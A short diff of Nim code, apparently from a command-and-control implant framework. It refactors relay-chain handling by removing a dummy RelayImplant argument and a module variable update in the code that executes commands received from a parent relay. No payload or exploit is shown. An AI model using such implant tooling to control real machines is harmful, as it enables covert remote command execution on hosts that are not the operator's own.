@@ -83,8 +83,6 @@ proc setRelayClientID(clientID: string) =
 
 proc setParentRelayServerGuid(guid: string) =
     g_parentRelayServerGuid = guid
-    # Also update the relay_commands module variable
-    relay_commands.g_localParentRelayServerGuid = guid
     when defined debug:
         echo "[DEBUG] 🔗 Chain Info: Set parent relay server GUID to: " & guid
 
@@ -1860,9 +1858,6 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                         echo "[DEBUG] 🔧 │ Using parseCmdRelay() instead of direct processing │"
                         echo "[DEBUG] 🔧 └─────────────────────────────────────────────────────────┘"
                     
-                    # Create a dummy RelayImplant for parseCmdRelay (it's not used in the function)
-                    var dummyRelayImplant: RelayImplant
-                    
                     echo ""
                     echo "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡"
                     echo "⚡ EXECUTING COMMAND: '" & actualCommand & "'"
@@ -1871,7 +1866,7 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                     echo "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡"
                     echo ""
                     
-                    let result = cmdParser.parseCmdRelay(dummyRelayImplant, actualCommand, cmdGuid, args)
+                    let result = cmdParser.parseCmdRelay(actualCommand, cmdGuid, args)
                     
                     # ========== SUPER PROMINENT RESPONSE DEBUG ==========
                     when defined debug:
